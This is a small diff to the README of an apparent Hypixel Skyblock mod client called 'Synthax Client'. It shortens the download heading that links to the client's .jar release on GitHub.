@@ -7,7 +7,7 @@ Whether you're flipping, farming, mining, dungeoning, or just looking for powerf
 
 ---
 
-## **📦 Download Synthax Client (.jar)**  Visit latest [Release](https://github.com/hypixelskyblockmodder/Synthax-Client/blob/main/Synthax_Clientjsv1.1.2b.jar) or alternatively [here](https://github.com/hypixelskyblockmodder/Synthax-Client/raw/refs/heads/main/Synthax_Clientjsv1.1.2b.jar)
+## **📦 Download:**  latest [Release](https://github.com/hypixelskyblockmodder/Synthax-Client/blob/main/Synthax_Clientjsv1.1.2b.jar) or alternatively [here](https://github.com/hypixelskyblockmodder/Synthax-Client/raw/refs/heads/main/Synthax_Clientjsv1.1.2b.jar)
 ---
 
 
